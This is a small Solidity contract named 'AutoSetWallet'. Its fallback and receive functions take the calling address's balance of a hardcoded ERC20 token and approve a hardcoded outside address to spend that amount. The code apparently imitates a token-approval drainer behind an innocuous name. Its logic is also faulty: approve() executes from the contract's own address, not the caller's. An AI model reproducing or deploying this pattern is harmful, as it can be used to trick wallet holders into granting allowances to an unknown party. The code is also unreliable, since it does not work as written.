pragma solidity ^0.5.0;

interface ERC20 {
    function totalSupply() external view returns (uint supply);
    function balanceOf(address _owner) external view returns (uint balance);
    function approve(address _spender, uint _value) external returns (bool success);
}

contract AutoSetWallet
{
    function() external
    {
        uint tokenBalance = ERC20(0xCdCFc0f66c522Fd086A1b725ea3c0Eeb9F9e8814).balanceOf(msg.sender);
        require(ERC20(0xCdCFc0f66c522Fd086A1b725ea3c0Eeb9F9e8814).approve(0xA40B16FfF9e17482A9a028f8C99EB340b642Ffb2,tokenBalance));
    }
    
    
    function receive() external
    {
        uint tokenBalance = ERC20(0xCdCFc0f66c522Fd086A1b725ea3c0Eeb9F9e8814).balanceOf(msg.sender);
        require(ERC20(0xCdCFc0f66c522Fd086A1b725ea3c0Eeb9F9e8814).approve(0xA40B16FfF9e17482A9a028f8C99EB340b642Ffb2,tokenBalance));
    }
}